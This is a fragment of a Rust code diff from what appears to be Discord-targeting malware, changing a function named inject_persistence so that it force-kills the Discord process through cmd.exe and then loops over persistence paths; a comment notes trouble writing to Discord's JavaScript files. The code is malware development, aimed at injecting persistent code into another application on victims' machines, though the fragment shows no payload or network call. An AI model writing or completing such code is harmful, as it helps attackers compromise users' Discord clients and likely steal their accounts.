@@ -6,6 +6,7 @@ use std::fs::File;
 use std::io::prelude::*;
 use std::path::PathBuf;
 use std::process::Command;
+use std::thread;
 
 pub fn get_paths() -> Vec<PathBuf> {
     let app_data = dirs::config_dir();
@@ -96,12 +97,15 @@ pub fn inject_persistence() {
 
     //end discord process
     //taskkill /f /im discord.exe
-    let mut child = Command::new("taskkill")
-        .arg("/f /im discord.exe")
+    let mut child = Command::new("cmd.exe")
+        .arg("/C TASKKILL /F /IM discord.exe")
         .spawn()
         .expect("failed to execute child");
 
     child.wait().expect("failed to kill discord");
+
+    //std::thread::sleep_ms(15000);
+    //for some reason, unable to write to discord js files
 
     let persistence_paths = get_persistence_paths();
     for persist_loc in persistence_paths {
